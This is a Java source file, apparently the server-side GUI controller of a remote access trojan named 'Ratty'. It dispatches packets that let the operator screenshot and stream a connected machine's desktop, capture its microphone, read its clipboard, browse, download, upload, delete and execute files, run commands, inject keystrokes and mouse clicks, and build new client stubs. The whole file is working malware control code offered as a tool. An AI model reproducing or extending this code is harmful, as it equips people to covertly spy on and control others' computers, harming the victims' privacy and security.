package de.sogomn.rat.server.gui;

import java.awt.image.BufferedImage;
import java.io.File;
import java.util.ArrayList;

import javax.swing.JFileChooser;
import javax.swing.JOptionPane;

import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.IClientObserver;
import de.sogomn.rat.builder.StubBuilder;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.CommandPacket;
import de.sogomn.rat.packet.CreateFolderPacket;
import de.sogomn.rat.packet.DeleteFilePacket;
import de.sogomn.rat.packet.DesktopStreamPacket;
import de.sogomn.rat.packet.DownloadFilePacket;
import de.sogomn.rat.packet.ExecuteFilePacket;
import de.sogomn.rat.packet.FileSystemPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.packet.KeyEventPacket;
import de.sogomn.rat.packet.MouseEventPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.packet.UploadFilePacket;
import de.sogomn.rat.packet.VoicePacket;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.IServerObserver;
import de.sogomn.rat.util.FrameEncoder.IFrame;

/*
 * THIS CLASS IS A MESS!
 * I HAVE NO IDEA HOW ONE MAKES NON-MESSY CONTROLLER CLASSES
 */
public final class RattyGuiController implements IServerObserver, IClientObserver, IGuiController {
	
	private RattyGui gui;
	private JFileChooser fileChooser;
	
	private ArrayList<ServerClient> clients;
	
	public RattyGuiController(final RattyGui gui) {
		this.gui = gui;
		
		fileChooser = new JFileChooser();
		clients = new ArrayList<ServerClient>();
		
		gui.setController(this);
	}
	
	private ServerClient getServerClient(final ActiveClient client) {
		for (final ServerClient serverClient : clients) {
			if (serverClient.client == client) {
				return serverClient;
			}
		}
		
		return null;
	}
	
	private File chooseFile() {
		final int input = fileChooser.showOpenDialog(null);
		
		if (input == JFileChooser.APPROVE_OPTION) {
			return fileChooser.getSelectedFile();
		}
		
		return null;
	}
	
	private IPacket getPacket(final String command, final ServerClient serverClient) {
		IPacket packet = null;
		
		if (command == RattyGui.POPUP) {
			packet = PopupPacket.create();
		} else if (command == RattyGui.FREE) {
			packet = new FreePacket();
		} else if (command == RattyGui.SCREENSHOT) {
			packet = new ScreenshotPacket();
		} else if (command == RattyGui.COMMAND) {
			packet = CommandPacket.create();
		} else if (command == RattyGui.DESKTOP && !serverClient.isStreamingDesktop()) {
			packet = new DesktopStreamPacket(true);
		} else if (command == RattyGui.CLIPBOARD) {
			packet = new ClipboardPacket();
		} else if (command == FileTreePanel.REQUEST) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			final String path = treePanel.getLastPathClicked();
			
			packet = new FileSystemPacket(path);
			
			treePanel.removeChildren(path);
		} else if (command == FileTreePanel.DOWNLOAD) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			final String path = treePanel.getLastPathClicked();
			
			packet = new DownloadFilePacket(path);
		} else if (command == FileTreePanel.UPLOAD) {
			final File file = chooseFile();
			
			if (file != null) {
				final String localPath = file.getAbsolutePath();
				final FileTreePanel treePanel = serverClient.getTreePanel();
				final String path = treePanel.getLastNodePathFolder();
				
				packet = new UploadFilePacket(localPath, path);
			}
		} else if (command == FileTreePanel.EXECUTE) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			final String path = treePanel.getLastPathClicked();
			
			packet = new ExecuteFilePacket(path);
		} else if (command == FileTreePanel.NEW_FOLDER) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			final String path = treePanel.getLastNodePathFolder();
			final String name = JOptionPane.showInputDialog(null);
			
			if (name != null && !name.isEmpty()) {
				packet = new CreateFolderPacket(path, name);
			}
		} else if (command == FileTreePanel.DELETE) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			final String path = treePanel.getLastPathClicked();
			
			packet = new DeleteFilePacket(path);
			
			treePanel.removeFile(path);
		} else if (command == DisplayPanel.KEY_PRESSED && serverClient.isStreamingDesktop()) {
			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
			final int key = displayPanel.getLastKeyHit();
			
			packet = new KeyEventPacket(key, KeyEventPacket.PRESS);
		} else if (command == DisplayPanel.KEY_RELEASED && serverClient.isStreamingDesktop()) {
			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
			final int key = displayPanel.getLastKeyHit();
			
			packet = new KeyEventPacket(key, KeyEventPacket.RELEASE);
		} else if (command == DisplayPanel.MOUSE_PRESSED && serverClient.isStreamingDesktop()) {
			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
			final int x = displayPanel.getLastXPos();
			final int y = displayPanel.getLastYPos();
			final int button = displayPanel.getLastButtonHit();
			
			packet = new MouseEventPacket(x, y, button, MouseEventPacket.PRESS);
		} else if (command == DisplayPanel.MOUSE_RELEASED && serverClient.isStreamingDesktop()) {
			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
			final int x = displayPanel.getLastXPos();
			final int y = displayPanel.getLastYPos();
			final int button = displayPanel.getLastButtonHit();
			
			packet = new MouseEventPacket(x, y, button, MouseEventPacket.RELEASE);
		} else if (command == RattyGui.VOICE && !serverClient.isStreamingVoice()) {
			packet = new VoicePacket();
		}
		
		return packet;
	}
	
	private void handle(final ServerClient serverClient, final ScreenshotPacket packet) {
		final BufferedImage image = packet.getImage();
		
		serverClient.getDisplayPanel().showImage(image);
	}
	
	private void handle(final ServerClient serverClient, final DesktopStreamPacket packet) {
		final IFrame frame = packet.getFrame();
		final int screenWidth = packet.getScreenWidth();
		final int screenHeight = packet.getScreenHeight();
		final DesktopStreamPacket request = new DesktopStreamPacket();
		final DisplayPanel displayPanel = serverClient.getDisplayPanel();
		
		displayPanel.showFrame(frame, screenWidth, screenHeight);
		
		serverClient.client.addPacket(request);
	}
	
	private void handle(final ServerClient serverClient, final VoicePacket packet) {
		final VoicePacket voice = new VoicePacket();
		
		packet.execute(serverClient.client);
		
		serverClient.client.addPacket(voice);
	}
	
	private void handle(final ServerClient serverClient, final FileSystemPacket packet) {
		final FileTreePanel treePanel = serverClient.getTreePanel();
		final String[] paths = packet.getPaths();
		
		for (final String path : paths) {
			treePanel.addFile(path);
		}
	}
	
	private void handle(final ServerClient serverClient, final InformationPacket packet) {
		final String name = packet.getName();
		final String os = packet.getOs();
		final String version = packet.getVersion();
		
		serverClient.logIn(name, os, version);
		serverClient.setController(this);
		
		gui.addRow(serverClient);
	}
	
	@Override
	public void packetReceived(final ActiveClient client, final IPacket packet) {
		final ServerClient serverClient = getServerClient(client);
		final boolean loggedIn = serverClient.isLoggedIn();
		
		if (loggedIn) {
			if (packet instanceof ScreenshotPacket) {
				final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
				
				handle(serverClient, screenshot);
			} else if (packet instanceof DesktopStreamPacket) {
				final boolean streamingDesktop = serverClient.isStreamingDesktop();
				
				if (streamingDesktop) {
					final DesktopStreamPacket stream = (DesktopStreamPacket)packet;
					
					handle(serverClient, stream);
				}
			} else if (packet instanceof VoicePacket) {
				final boolean streamingVoice = serverClient.isStreamingVoice();
				
				if (streamingVoice) {
					final VoicePacket voice = (VoicePacket)packet;
					
					handle(serverClient, voice);
				}
			} else if (packet instanceof FileSystemPacket) {
				final FileSystemPacket file = (FileSystemPacket)packet;
				
				handle(serverClient, file);
			} else {
				packet.execute(client);
			}
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			handle(serverClient, information);
		}
	}
	
	@Override
	public void clientDisconnected(final ActiveClient client) {
		final ServerClient serverClient = getServerClient(client);
		final FileTreePanel treePanel = serverClient.getTreePanel();
		
		serverClient.setStreamingDesktop(false);
		serverClient.setController(null);
		
		client.setObserver(null);
		client.close();
		clients.remove(client);
		
		treePanel.setVisible(false);
		gui.removeRow(serverClient);
	}
	
	@Override
	public synchronized void clientConnected(final ActiveServer server, final ActiveClient client) {
		final ServerClient serverClient = new ServerClient(client);
		final InformationPacket packet = new InformationPacket();
		
		client.setObserver(this);
		clients.add(serverClient);
		client.start();
		client.addPacket(packet);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		//...
	}
	
	@Override
	public void userInput(final String command) {
		final ServerClient serverClient = gui.getLastServerClientClicked();
		final IPacket packet = getPacket(command, serverClient);
		
		if (packet != null) {
			serverClient.client.addPacket(packet);
		}
		
		if (command == RattyGui.DESKTOP) {
			final boolean streaming = serverClient.isStreamingDesktop();
			
			serverClient.setStreamingDesktop(!streaming);
			gui.updateTable();
		} else if (command == RattyGui.FILES) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			
			treePanel.setVisible(true);
		} else if (command == RattyGui.BUILD) {
			StubBuilder.start();
		} else if (command == RattyGui.VOICE) {
			final boolean streaming = serverClient.isStreamingVoice();
			
			serverClient.setStreamingVoice(!streaming);
			gui.updateTable();
		}
	}
	
}
